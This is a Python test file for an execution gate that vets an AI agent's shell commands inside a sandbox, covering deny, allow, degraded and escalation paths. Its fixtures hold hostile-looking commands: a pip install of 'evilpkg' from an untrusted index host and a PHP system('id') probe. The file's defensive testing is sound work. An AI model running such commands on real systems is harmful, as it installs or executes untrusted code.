"""Wiring cells for the live enforcement point (gate 0.3.13).

The R-table becomes the decision layer every proposed execution passes before
the container execs. These cells exercise the enforcement sequence without the
agents SDK: a fake invoke callable stands in for the container exec, and a fake
session stands in for the observation channel.
"""

from __future__ import annotations

import asyncio
import json
import logging
from typing import TYPE_CHECKING, Any


if TYPE_CHECKING:
    from pathlib import Path

    import pytest

from sagaward.core.provenance import ProvenanceLedger
from sagaward.core.provenance.gate import ReasonCode
from sagaward.runtime import exec_guard
from sagaward.runtime.exec_guard import (
    authorize,
    guarded_invoke,
    guarded_stdin_invoke,
    rule_id,
    stdin_command_text,
)


class _Result:
    def __init__(self, stdout: bytes = b"", stderr: bytes = b"", code: int = 0) -> None:
        self.stdout = stdout
        self.stderr = stderr
        self.exit_code = code

    def ok(self) -> bool:
        return self.exit_code == 0


class _Session:
    def __init__(self, answers: list[bytes]) -> None:
        self._answers = answers
        self.calls: list[tuple[tuple[str, ...], object]] = []

    async def exec(
        self,
        *command: str,
        timeout: float | None = None,  # noqa: ARG002 - mirrors the SDK signature
        shell: bool | list[str] = True,
    ) -> _Result:
        argv = tuple(str(item) for item in command)
        self.calls.append((argv, shell))
        index = min(len(self.calls), len(self._answers)) - 1
        return _Result(self._answers[index])


class _Ctx:
    def __init__(self, context: dict[str, Any]) -> None:
        self.context = context


class _Coordinator:
    def __init__(self) -> None:
        self.reasons: list[str] = []

    async def kill_switch(self, reason: str) -> None:
        self.reasons.append(reason)


class _Invoked:
    def __init__(self, result: str = "EXECUTED") -> None:
        self.calls = 0
        self._result = result

    async def __call__(self) -> str:
        self.calls += 1
        return self._result


def _home(tmp_path: Path) -> Path:
    home = tmp_path / "home"
    home.mkdir()
    return home


DENY_COMMAND = (
    "HOME={home} pip --index-url http://target/simple install --only-binary=:all: evilpkg"
)
ALLOW_COMMAND = "HOME={home} pip install --only-binary=:all: yt-dlp"


def _raw(command: str, workdir: str | None = None) -> str:
    payload: dict[str, str] = {"command": command}
    if workdir is not None:
        payload["workdir"] = workdir
    return json.dumps(payload)


class TestEnforcementPoint:
    def test_a_denied_command_never_executes(self, tmp_path: Path, caplog: Any) -> None:
        command = DENY_COMMAND.format(home=_home(tmp_path))
        ctx = _Ctx({"provenance": ProvenanceLedger()})

        with caplog.at_level(logging.INFO, logger="sagaward.runtime.exec_guard"):
            outcome = asyncio.run(authorize(ctx, command))

        assert outcome.allowed is False
        assert outcome.rule == "R5\u2033"
        assert outcome.reason is not None and outcome.reason.value == "unsafe_install_source"
        assert "R5\u2033" in (outcome.refusal or "")
        assert "unsafe_install_source" in (outcome.refusal or "")
        assert "apf_gate DENY R5\u2033" in caplog.text

    def test_an_allowed_command_executes_and_reconciles(self, tmp_path: Path) -> None:
        command = ALLOW_COMMAND.format(home=_home(tmp_path))
        session = _Session([b"[]", b"[]", b"", b"[]"])
        ctx = _Ctx({"provenance": ProvenanceLedger(), "sandbox_session": session})
        invoke = _Invoked("EXECUTED")

        result = asyncio.run(guarded_invoke(ctx, _raw(command), invoke))

        assert result == "EXECUTED"
        assert invoke.calls == 1
        # snapshot (pre-exec) + quarantine page + scratch walk + install walk
        assert len(session.calls) == 4
        assert ctx.context["apf_gate"]["allowed"] == 1

    def test_a_degraded_decision_is_audited_with_the_command_text(self, caplog: Any) -> None:
        command = """php -r 'system("id");'"""
        ctx = _Ctx({"provenance": ProvenanceLedger()})

        with caplog.at_level(logging.INFO, logger="sagaward.runtime.exec_guard"):
            outcome = asyncio.run(authorize(ctx, command))

        assert outcome.allowed is True
        assert outcome.degraded is True
        assert outcome.rule == "R8"
        assert "apf_gate ALLOW R8" in caplog.text
        # A7: the command text and the resolved target spellings, not a count.
        assert "php -r" in caplog.text
        assert "UNRESOLVED" in caplog.text

    def test_a_gate_failure_refuses_and_escalates(
        self, monkeypatch: pytest.MonkeyPatch, caplog: Any
    ) -> None:
        def boom(*_args: object, **_kwargs: object) -> object:
            raise RuntimeError("rule table unavailable")

        monkeypatch.setattr(exec_guard, "classify", boom)
        coordinator = _Coordinator()
        ctx = _Ctx({"provenance": ProvenanceLedger(), "coordinator": coordinator})

        with caplog.at_level(logging.CRITICAL, logger="sagaward.runtime.exec_guard"):
            outcomes = [asyncio.run(authorize(ctx, "ls -la")) for _ in range(3)]

        assert all(outcome.allowed is False for outcome in outcomes)
        assert all(outcome.rule == "gate_unavailable" for outcome in outcomes)
        assert "not executed" in (outcomes[0].refusal or "")
        assert len(coordinator.reasons) == 1, "escalation fires at the limit"
        assert ctx.context["apf_gate"]["consecutive_failures"] == 3

    def test_a_refusal_is_a_tool_surface_value_not_an_exception(self, tmp_path: Path) -> None:
        command = DENY_COMMAND.format(home=_home(tmp_path))
        ctx = _Ctx({"provenance": ProvenanceLedger()})
        invoke = _Invoked()

        result = asyncio.run(guarded_invoke(ctx, _raw(command), invoke))

        assert isinstance(result, str)
        assert result.startswith("apf-action-gate: DENY")
        assert invoke.calls == 0

    def test_the_decision_precedes_the_exec(self) -> None:
        # No leading HOME= assignment: the install trigger must fire, or the cell
        # has no observation traffic to observe and cannot exercise the order.
        command = "pip install --index-url http://target/simple --only-binary=:all: evilpkg"
        session = _Session([b"", b"", b"", b""])
        ctx = _Ctx({"provenance": ProvenanceLedger(), "sandbox_session": session})
        invoke = _Invoked()

        asyncio.run(guarded_invoke(ctx, _raw(command), invoke))

        assert invoke.calls == 0, "a denied action must not exec"
        assert session.calls == [], "no observation traffic for a denied action"


class TestStdinGate:
    """S-3: the write_stdin payloads pass the same gate as the exec payloads."""

    def test_stdin_reader_extracts_chars_and_skip_classes(self) -> None:
        assert stdin_command_text('{"chars": "ls -la"}') == ("ls -la", None)
        assert stdin_command_text("not json") == (None, "non_json")
        assert stdin_command_text("[1]") == (None, "not_object")
        assert stdin_command_text('{"session_id": 1}') == (None, "missing_chars")
        assert stdin_command_text('{"chars": 42}') == (None, "non_string_chars")

    def test_a_tainted_stdin_payload_never_writes(self, tmp_path: Path) -> None:
        command = DENY_COMMAND.format(home=_home(tmp_path))
        ctx = _Ctx({"provenance": ProvenanceLedger()})
        invoke = _Invoked()

        result = asyncio.run(
            guarded_stdin_invoke(ctx, json.dumps({"chars": command}), invoke)
        )

        assert isinstance(result, str)
        assert result.startswith("apf-action-gate: DENY")
        assert invoke.calls == 0

    def test_an_allowed_stdin_payload_writes(self, tmp_path: Path) -> None:
        command = ALLOW_COMMAND.format(home=_home(tmp_path))
        ctx = _Ctx({"provenance": ProvenanceLedger()})
        invoke = _Invoked("WRITTEN")

        result = asyncio.run(
            guarded_stdin_invoke(ctx, json.dumps({"chars": command}), invoke)
        )

        assert result == "WRITTEN"
        assert invoke.calls == 1
        assert ctx.context["apf_gate"]["allowed"] == 1

    def test_an_unreadable_stdin_payload_is_audited(self, caplog: Any) -> None:
        ctx = _Ctx({"provenance": ProvenanceLedger()})
        invoke = _Invoked("WRITTEN")
        with caplog.at_level(logging.WARNING, logger="sagaward.runtime.exec_guard"):
            result = asyncio.run(guarded_stdin_invoke(ctx, "not json", invoke))

        assert result == "WRITTEN"
        assert invoke.calls == 1
        assert "apf_gate SKIP non_json" in caplog.text


class TestSkipAuditAndPins:
    """Round-26: the skip is audited, the derivation table is pinned, and the
    escalation counter's reset semantics are fixed in a cell."""

    def test_an_unreadable_payload_is_audited_not_silent(self, caplog: Any) -> None:
        payloads = {
            "not json": "non_json",
            "[1, 2]": "not_object",
            '{"workdir": "/workspace"}': "missing_command",
            '{"command": 42}': "non_string_command",
        }
        for raw, skip_class in payloads.items():
            ctx = _Ctx({"provenance": ProvenanceLedger()})
            invoke = _Invoked("EXECUTED")
            with caplog.at_level(logging.WARNING, logger="sagaward.runtime.exec_guard"):
                result = asyncio.run(guarded_invoke(ctx, raw, invoke))

            assert result == "EXECUTED", "the skip proceeds — refusal was rejected"
            assert invoke.calls == 1
            assert f"apf_gate SKIP {skip_class}" in caplog.text
            assert "apf_gate" not in ctx.context, "a skipped decision leaves no gate state"
            caplog.clear()

    def test_the_miss_rule_derivation_is_total(self) -> None:
        from sagaward.core.provenance.gate import (  # noqa: PLC0415 - local to the cell
            Action,
            ActionDecision,
            ActionKind,
        )

        expected = {
            ActionKind.EXECUTE: "R3",
            ActionKind.CHMOD_EXEC: "R4'",
            ActionKind.PACKAGE_INSTALL: "R5'",
            ActionKind.WRITE_HOST_MOUNT: "R6'",
        }
        for kind, rule in expected.items():
            action = Action(kind=kind, command="x")
            decision = ActionDecision(
                verdict="DENY", reason=ReasonCode.PROVENANCE_MISS, tier="high_impact"
            )
            assert rule_id(action, decision) == rule

        unsafe = Action(kind=ActionKind.PACKAGE_INSTALL, command="x")
        denied = ActionDecision(
            verdict="DENY", reason=ReasonCode.UNSAFE_INSTALL_SOURCE, tier="high_impact"
        )
        assert rule_id(unsafe, denied) == "R5\u2033"
        allowed = ActionDecision(
            verdict="ALLOW", reason=ReasonCode.ALLOWED, tier="high_impact", degraded=True
        )
        assert rule_id(unsafe, allowed) == "R8"
        allowed_clean = ActionDecision(
            verdict="ALLOW", reason=ReasonCode.ALLOWED, tier="high_impact"
        )
        assert rule_id(unsafe, allowed_clean) == "R9"

    def test_the_escalation_counter_resets_on_any_decision_and_refires(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        real_classify = exec_guard.classify

        def boom(*_args: object, **_kwargs: object) -> object:
            raise RuntimeError("rule table unavailable")

        coordinator = _Coordinator()
        ctx = _Ctx({"provenance": ProvenanceLedger(), "coordinator": coordinator})
        deny = "pip --index-url http://target/simple install --only-binary=:all: evilpkg"

        monkeypatch.setattr(exec_guard, "classify", boom)
        asyncio.run(authorize(ctx, "ls"))
        asyncio.run(authorize(ctx, "ls"))
        assert coordinator.reasons == [], "two failures do not escalate"

        # A DENY is a successful decision and resets the counter (the literal
        # "consecutive" reading, pinned here).
        monkeypatch.setattr(exec_guard, "classify", real_classify)
        denied = asyncio.run(authorize(ctx, deny))
        assert denied.allowed is False
        assert denied.rule == "R5\u2033"
        assert ctx.context["apf_gate"]["consecutive_failures"] == 0

        monkeypatch.setattr(exec_guard, "classify", boom)
        asyncio.run(authorize(ctx, "ls"))
        asyncio.run(authorize(ctx, "ls"))
        assert coordinator.reasons == [], "the reset held across two more failures"

        asyncio.run(authorize(ctx, "ls"))
        assert len(coordinator.reasons) == 1, "third consecutive failure escalates"
        asyncio.run(authorize(ctx, "ls"))
        assert len(coordinator.reasons) == 2, "every failure at/after the limit refires"
